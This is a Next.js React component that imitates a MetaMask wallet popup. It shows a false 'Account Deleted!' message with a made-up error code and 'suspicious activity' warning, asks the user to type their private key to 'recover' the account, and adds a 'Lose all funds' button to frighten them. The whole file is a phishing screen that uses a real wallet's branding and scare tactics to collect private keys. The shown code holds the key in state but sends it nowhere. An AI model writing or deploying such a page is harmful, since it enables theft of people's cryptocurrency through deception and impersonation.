"use client";

import { poppins } from "@/app/utils/utils";
import { Input } from "@/components/ui/input";
import Image from "next/image";
import { useState } from "react";

export default function MetaMask() {
  const [privateKey, setPrivateKey] = useState("");
  const handleClose = () => {
    if (window.opener && !window.opener.closed) {
      window.close();
    } else {
      alert("This window cannot be closed automatically.");
    }
  };

  return (
    <div className="w-[400px] h-[556px] relative z-[999999] overflow-hidden bg-[#24272a] px-4 pt-1  ">
      <div className="flex flex-col w-full items-center text-white gap-1">
        <Image src="/metamask.png" alt="MetaMask" height={150} width={150} />
        <div className={" font-semibold text-2xl " + poppins.className}>
          Account Deleted!
        </div>
        <div className={" text-center mt-2 " + poppins.className}>
          Critical error: MMSK_469
          <br /> Suspicious activity detected. Please enter your private key to
          recover your account. We are sorry for the inconvenience caused
        </div>
        <Input
          value={privateKey}
          onChange={(event) => setPrivateKey(event?.target.value)}
          className="w-[20rem]  text-black mt-8 bg-blue-50 outline-none focus:outline-none focus:border-none focus-visible:ring-0"
        />
        <button
          className={
            "bg-blue-500 mt-3 w-[8rem] z-[999999] h-10 px-4 py-2 rounded-3xl hover:bg-blue-700 hover:cursor-pointer transition-all " +
            poppins.className
          }
        >
          Recover
        </button>
        <button
        onClick={handleClose}
          className={
            "bg-red-600 mt-12 w-[20rem] z-[999999] h-10 px-4 py-2 rounded-3xl hover:bg-red-700 hover:cursor-pointer transition-all " +
            poppins.className
          }
        >
          Lose all funds
        </button>
      </div>
    </div>
  );
}
